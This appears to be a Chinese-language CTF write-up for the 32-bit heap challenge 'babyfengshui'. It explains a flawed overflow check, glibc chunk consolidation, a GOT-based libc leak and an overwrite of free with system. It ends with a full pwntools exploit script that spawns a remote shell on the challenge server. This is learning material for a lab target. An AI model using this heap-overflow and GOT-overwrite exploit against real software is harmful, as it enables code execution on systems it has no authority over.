---
title: babyfengshui
date: 2023-01-02 19:54:26
categories: 
- pwn_wp
tags: 
- pwn
- heap
---
这是一个32位的堆题，堆风水。
<!-- more -->

查壳
![check](C:\Users\95368\Documents\GitHub\pwn-study-diary\wp\babyfengshui\picture\check.png)


是一个菜单，里面的user结构大概如下：

```c
struct user
{
    char* description;//根据输入的size申请
    char name[124];
}
//在申请的0x80的chunk（user）中，第一个4byte是description的指针，后面存放的是name
```

在update函数中，有一个对堆溢出的检测

```c
// 防止description的chunk溢出到该userchunk的size，但是可以溢出到pre_size
// 而且可能只有一开始chunk比较整齐的时候有用，若经过申请和释放description和user的chunk不连续，则失效
if ( (char *)(length + *(_DWORD *)*(&ptr + index)) >= (char *)*(&ptr + index) - 4 )
{                                           
  puts("my l33t defenses cannot be fooled, cya!");
  exit(1);
}

```

if中条件的意思是：description中写的范围最多到该description的user的size位前。

由于在add user的函数中，先malloc的是description的chunk，因此可以防止update时溢出到user的size以及后面的数据。

但是，如果先申请的user被delete了，释放的user和description可能会在后续的过程中（甚至释放的时候）被合并，那么在后面申请新的user时，若合并后的部分不足以容纳新的description和user，则会造成description和其user并不连续，该防护就会不起作用，而我们要做的就是造成这种合并。

**consolidate的机制（合并）**

在malloc和free的时候都可能会出现合并的情况

**malloc的情况：**

malloc中的合并通常都是调用malloc_consolidate()函数对fast bins进行整理。当在small bins中查找时，若small bins尚未初始化，则合并fast bins中的chunk。当fast bins 和 small bins 中的chunk的大小都不能满足时，在large bins中查找，首先会调用malloc_consolidate()对进行fast bins chunk进行合并，可以合并的合并后放到unsorted bin，不能合并的直接放到unsorted bin中。如果top chunk也不能满足需求，会先调用malloc_consolidate()对fast bins chunk进行合并后再重新进行一次分配。

malloc_consolidate()有两个作用：1.若fast bins未初始化，则初始化malloc_state;2.否则，合并fast bins中的chunk。

**free的情况：**

如果**chunk的大小不在fast bin的范围内**，free会尝试进行合并。合并首先考虑与**物理低地址**的相邻空闲chunk，再考虑**物理高地址**的相邻空闲chunk（两个chunk都不能是top chunk）。如果下一个chunk是top chunk，则当前chunk会合并到top chunk，并修改top chunk的大小。

如果合并后的 chunk 大小大于 64KB，并且 fast bins 中存在空闲 chunk，调用 malloc_consolidate()函数合并 fast bins 中的空闲 chunk 到 unsorted bin 中。

对chunk进行合理的布局后，经过恰当的释放和申请，让新申请的description和user不连续，则可以在update函数实现堆溢出，在update函数中，从user的前4byte（description）指向的位置开始，可以写到该user的size字段前。


在知道了这些之后，首先要考虑怎样才能**泄露libc**。

在这道题目中，有display的功能，可以输出description的内容。其具体的过程是利用printf函数输出user的第一个4byte所指向的内容。这里原本存放的是description的指针，如果通过堆溢出将其**修改为got表项的地址**，则可以输出一个函数的真实地址，并由此得到libc。

得到libc之后，就可以考虑如何**get shell**。

在update中我们可以注意到，写入description是写入user的前4byte指向的位置。在一般情况下，这个指针指向的是description，但在我们泄露libc的过程中，我们其实是可以对其他user的description指针所在位置进行修改的。如果我们对这个指针修改后再执行update，对写入该指针指向的位置，利用这点，我们可以将某一函数的got表项覆盖为system函数。

在此时，free函数就是个不错的选择，在delete user的时候，对调用free对user前四位指向的chunk进行释放，如果我们将free修改为system函数，并将要free的user的description设置为"/bin/sh\x00"，则可以执行system("/bin/sh\x00")。

exp：

```python
from pwn import*
from LibcSearcher import*
elf=ELF("./babyfengshui")
#p=process("./babyfengshui")
p=remote('node4.buuoj.cn',28361)
context.log_level='debug'

def add_user(size,name,length,text):
  p.recvuntil('Action: ')
	p.sendline('0')
	p.recvuntil('size of description: ')
	p.sendline(str(size))
	p.recvuntil('name: ')
	p.sendline(str(name))
	p.recvuntil('text length: ')
	p.sendline(str(length))
	p.recvuntil('text: ')
	p.sendline(text)

def del_user(idx):
	p.recvuntil('Action: ')
	p.sendline('1')
	p.recvuntil('index: ')
	p.sendline(str(idx))

def display(idx):
	p.recvuntil('Action: ')
	p.sendline('2')
	p.recvuntil('index: ')
	p.sendline(str(idx))

def update(idx,length,text):
	p.recvuntil('Action: ')
	p.sendline('3')
	p.recvuntil('index: ')
	p.sendline(str(idx))
	p.recvuntil('text length: ')
	p.sendline(str(length))
	p.recvuntil('text: ')
	p.sendline(text)


add_user(0x80,'chunk0',0x80,'nothing')
add_user(0x80,'chunk1',0x80,'nothing')
add_user(0x8,'chunk2',0x8,'/bin/sh\x00')
del_user(0)

print ('this is got : ' + hex(elf.got['free']))

#gdb.attach(p)

add_user(0x108,'chunk0_0',0x19c,'a'*0x198+p32(elf.got['free']))

display(1)
p.recvuntil('description: ')
data=u32(p.recv(4))
print hex(data)

libc=LibcSearcher('free',data)
libcbase=data-libc.dump('free')
print libcbase

sys=libcbase+libc.dump('system')

update(1,4,p32(sys))
del_user(2)

p.interactive()
```

